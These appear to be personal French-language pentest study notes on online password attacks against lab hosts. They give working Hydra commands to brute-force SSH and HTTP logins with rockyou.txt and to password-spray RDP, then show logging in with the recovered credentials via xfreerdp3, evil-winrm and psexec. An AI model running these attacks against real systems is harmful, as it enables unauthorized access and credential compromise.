```bash
## SSH

hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201

le -s pour spécifier le port
```
#### HTTP/S

```bash
On récupère via une requte post sur burp le champ user et password puis on met les placeholders ^USER^ et ^PASS^ et on met le champs d'erreur pour que hydra sache si c'est le bon password ou pas.

hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.66.201 http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid username or password" -V -s 8080 -f

Si il y'a un pop up pour rentrer les creds, c'est du GET donc faire:

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.201 http-get "/index.php" -V -s 80 -f 

```

```bash
## Password Spraying
On trouve le mdp SuperS3cure1337#

Pour RDP on test le mdp sur plein de users si on veut ajouter un nom comme daniel et justin on peut ajouter les noms à la liste:

echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt

hydra -t 1 -V -f  -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
```bash
Après avoir trouvé les creds

xfreerdp3 /u:daniel /p:SuperS3cure1337# /v:192.168.62.202

evil-winrm -i 192.168.62.202 -u daniel -p SuperS3cure1337#   

psexec daniel@192.168.62.202
```
